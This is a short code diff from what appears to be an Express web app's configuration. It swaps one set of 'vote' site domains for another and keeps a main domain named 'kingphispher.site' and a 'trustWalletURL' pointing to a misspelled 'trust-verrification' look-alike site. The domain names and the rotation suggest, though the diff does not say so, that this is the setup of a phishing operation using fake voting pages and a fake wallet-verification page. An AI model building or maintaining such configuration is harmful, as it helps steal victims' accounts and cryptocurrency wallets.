@@ -48,9 +48,9 @@ app.use(function (req, res, next) {
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
   req.app.voteUrl = "https://votehive.site";
-  req.app.voteUrl2 = "https://topchoicevote-2.site";
+  req.app.voteUrl2 = "https://votenexus.site";
   req.app.hostname1 = "votehive.site";
-  req.app.hostname2 = "topchoicevote-2.site";
+  req.app.hostname2 = "votenexus.site";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
